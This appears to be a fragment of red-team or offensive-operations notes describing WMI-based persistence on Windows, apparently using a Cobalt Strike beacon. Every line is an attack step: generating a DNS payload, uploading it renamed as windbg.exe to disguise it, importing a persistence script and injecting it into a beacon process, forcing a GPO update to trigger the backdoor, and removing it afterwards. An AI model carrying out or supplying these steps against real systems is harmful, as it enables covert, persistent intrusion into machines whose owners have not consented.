example using WMI...
  generate a DNS payload named dns_x64.exe
  upload to the target and rename to windbg.exe
  install the backdoor (WMIElevatedPersistence.ps1):
    powershell-import C:\Tools\WMIPersistence.ps1
    psinject [BEACON PID] x64 Add-WmiPersistence
  trigger the backdoor w a GPO update:
    execute gpupdate /target:computer /force
  remove persistence:
    psinject [BEACON PID] x64 Remove-WmiPersistence
    
